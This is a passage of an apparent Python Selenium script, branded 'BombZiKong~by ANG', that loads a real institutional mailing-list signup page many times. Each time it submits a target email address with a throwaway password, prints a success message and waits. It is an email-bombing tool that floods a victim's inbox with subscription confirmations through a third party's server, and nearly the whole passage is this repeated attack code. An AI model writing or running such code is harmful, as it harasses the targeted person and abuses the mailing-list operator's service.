email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))




browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
